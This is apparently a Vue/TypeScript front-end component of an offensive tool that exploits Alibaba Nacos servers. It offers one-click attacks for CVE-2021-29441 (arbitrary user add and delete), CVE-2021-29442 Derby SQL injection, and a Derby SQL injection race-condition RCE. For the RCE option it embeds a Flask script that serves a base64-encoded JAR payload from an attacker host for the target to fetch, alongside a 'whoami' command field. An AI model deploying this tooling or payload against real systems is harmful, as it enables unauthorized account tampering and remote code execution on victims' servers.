<script lang="ts" setup>
import { ElMessage } from 'element-plus';
import { AlibabaNacos } from 'wailsjs/go/main/App';
import { reactive } from 'vue';
import global from "@/global/index"
import { AddRightSubString } from '@/util';
const form = reactive({
    url: "",
    username: "qioxzcio",
    password: "Aoioxzcoio123.",
    command: "whoami",
    service: "",
    header: "",
    content: "",
    selectVulnerability: 0
})


function onChange() {
    if (form.selectVulnerability == 3) {
        form.content = `请复制下面脚本到VPS上启动，需要修改host和port端口和安装flask、requests的依赖

import base64
from flask import Flask, send_file,Response
import config

payload = b'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'

app = Flask(__name__)


@app.route('/download')
def download_file():
    data = base64.b64decode(payload)
    response = Response(data, mimetype="application/octet-stream")
    return response

if __name__ == '__main__':
    app.run(host='192.168.9.128', port='5000')`
    } else {
        form.content = ""
    } 
}

const vulnerabilityGroup = [
    {
        name: "CVE-2021-29441 STEP 1 任意用户添加",
        value: 0
    },
    {
        name: "CVE-2021-29441 STEP 2 任意用户删除",
        value: 1
    },
    {
        name: "CVE-2021-29442 Derby SQL注入",
        value: 2
    },
    {
        name: "Derby SQLi 条件竞争 RCE",
        value: 3
    }
]

async function useVulnerability() {
    form.url = AddRightSubString(form.url, "/")
    if (!form.service.endsWith("/")) {
        form.service += "/download"
    } else {
        form.service += "download"
    }
    if (form.selectVulnerability == 3 && !form.service) {
        ElMessage.warning("请输入服务端地址!")
        return   
    }
    form.content = await AlibabaNacos(form.url,form.header ,form.selectVulnerability, form.username, form.password, form.command, form.service, global.proxy)
}
</script>

<template>
    <el-form @submit.native.prevent="">
        <el-form-item>
            <div class="head">
                <el-input v-model="form.url" placeholder="请输入Nacos主页路径，例如 https://192.168.1.1/nacos/">
                    <template #prepend>
                        <el-select style="width: 300px;" placeholder="请选择漏洞" v-model="form.selectVulnerability" @change="onChange">
                            <el-option v-for="vulnerability in vulnerabilityGroup" :value="vulnerability.value"
                                :label="vulnerability.name" />
                        </el-select>
                    </template>
                </el-input>
                <el-button type="primary" @click="useVulnerability" class="ml5">执行</el-button>
            </div>
        </el-form-item>
        <el-form-item v-show="form.selectVulnerability == 0 || form.selectVulnerability == 1">
            <el-input v-model="form.username" style="width: 50%;">
                <template #prepend>
                    用户名:
                </template>
            </el-input>
            <el-input v-model="form.password" style="width: 50%;">
                <template #prepend>
                    密码:
                </template>
            </el-input>
        </el-form-item>
        <el-form-item v-show="form.selectVulnerability == 3">
            <el-input v-model="form.header">
                <template #prepend>
                    请求头:
                </template>
            </el-input>
        </el-form-item>
        <el-form-item v-show="form.selectVulnerability == 3">
            <el-input v-model="form.service" style="width: 50%;">
                <template #prepend>
                    Service:
                </template>
            </el-input>
            <el-input v-model="form.command" style="width: 50%;">
                <template #prepend>
                    CMD:
                </template>
            </el-input>
        </el-form-item>
    </el-form>
    <pre class="pretty-response" style="height: 63vh;"><code>{{ form.content }}</code></pre>
</template>

<style scoped>
.ml5 {
    margin-left: 5px;
}
</style>